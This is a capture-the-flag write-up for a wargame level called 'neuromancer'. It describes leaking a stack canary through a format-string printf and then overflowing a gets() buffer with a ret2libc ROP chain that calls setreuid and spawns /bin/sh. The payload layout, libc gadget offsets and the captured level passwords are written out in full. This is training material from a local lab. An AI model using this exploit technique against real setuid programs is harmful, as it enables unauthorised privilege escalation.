# level09 — "Neuromancer" — Format-String Canary Leak → `gets()` Overflow → ret2libc

## Concept

`./neuromancer`, SUID owned by `flag09`, home dir `/home/level09/`. Same
overall shape as level06 (format-string canary leak in one function,
unbounded `gets()` overflow in another, straightforward ret2libc) — a
"breather" level after level08's much harder pivot-and-syscalls exploit.
Solved on the first attempt with no dead ends worth reporting beyond the
normal recon steps.

## Recon

Login: `ssh level09@127.0.0.1 -p 4244`, password = level08's flag
(`l3w1pdvtlapo1nmo8uttd1m0pen4iiuk`).

No source. `nm ./neuromancer`: `init_nodes`, `print_banner`,
`handle_command`, `info_leak`, `console_handshake`, `process_input`,
`show_node`, called from `main`/`handle_command` in that order.
`checksec`: canary found, NX enabled, no PIE. `getent passwd flag09` →
uid 1026.

`info_leak()` unconditionally prints `[NEUROMANCER] puts@libc: %p`
on every single run — a free, no-exploitation-needed libc-base
confirmation (matches the already-known `0x7ffff7c00000` for this VM
exactly). Not load-bearing here since ASLR is off system-wide, but
would be the key to the whole level on a hardened target.

`console_handshake()`: `fgets(buf, 0x40, stdin)` into an 80-byte
buffer (bounded, safe) then `printf(buf)` directly — the by-now-standard
one-shot format-string leak.

`process_input()`: unbounded `gets(buf)` into a 144-byte buffer
(`sub $0xa0,%rsp`, buf at `rbp-0x90`) — offset to the canary at
`rbp-0x8` is 136 bytes, arithmetically identical to level06's
`authenticate()`. The `strncmp`-gated "NODE:"/"LIST" command branches
that follow don't matter for the exploit; `gets()` overflows
unconditionally regardless of which branch is later taken.

## Retrieving the addresses, command by command

`info_leak()` unconditionally prints `puts@libc` on every run, giving
a free libc-base confirmation that matches the already-known
`0x7ffff7c00000` for this VM. It isn't load-bearing here since ASLR is
off system-wide, but would be the whole key to the level on a hardened
target.

The canary leaks through `console_handshake`'s `printf(buf)`; probing
`%N$p` for a value with a `0x00` low byte lands on argument index 15
(also visible, redundantly, at 19 and 23) — the value itself changes
per run, but the trailing zero byte is always there.

`process_input`'s `gets(buf)` overflows a 144-byte buffer
(`sub $0xa0,%rsp`, buf at `rbp-0x90`) unconditionally, regardless of
which command branch runs afterward; the offset to the canary is 136
bytes, arithmetically identical to level06's `authenticate()`.

Since the libc base is identical across the whole series, every
gadget offset from the earlier levels transfers directly with no
re-derivation: `pop rdi ; ret`, `pop rsi ; pop rbp ; ret`, `setreuid`,
a plain `ret` (alignment fixup), `system`, and libc's own `"/bin/sh"`
string. The alignment-fixup count `n_extra_ret = 1` (matching
level03/06/07) works on the first attempt, confirmed by the spawned
shell showing `uid=1026(flag09)`.

## Exploit

Two-stage interactive session (see `exploit.py`):

```
$ ./neuromancer
[NEUROMANCER] puts@libc: 0x7ffff7c87be0    <- free info leak, unused here
[NEUROMANCER] Console handle: %15$p        <- canary leak probe
[NEUROMANCER] Trace echo: 0xfa45eb392fef0400   <- canary, parsed from this line
[NEUROMANCER] Interface: <136 bytes junk><canary><8 junk><ROP chain>
```

ROP chain (offset 136 to canary, `process_input`'s frame):
```
  136 bytes junk
  <leaked canary>
  8 bytes junk              (saved rbp, unused)
  pop rdi ; ret            (libc +0x10f78b)
  1026                     (flag09's real uid)
  pop rsi ; pop rbp ; ret  (libc +0x2b46b)
  1026
  0                        (junk, popped into rbp)
  setreuid                 (libc +0x1270d0)
  pop rdi ; ret
  BINSH                    (libc +0x1cb42f, "/bin/sh")
  ret                      (libc +0x2882f, ONE alignment fixup)
  system                   (libc +0x58750)
```

```
$ id
uid=1026(flag09) gid=1012(level09) groups=1012(level09),1001(levelgroup)
$ cat /home/flag09/.pass
kl9th7ox72218n3jlf554eymtlaynogo
```

Verified: this string works as level10's SSH password.

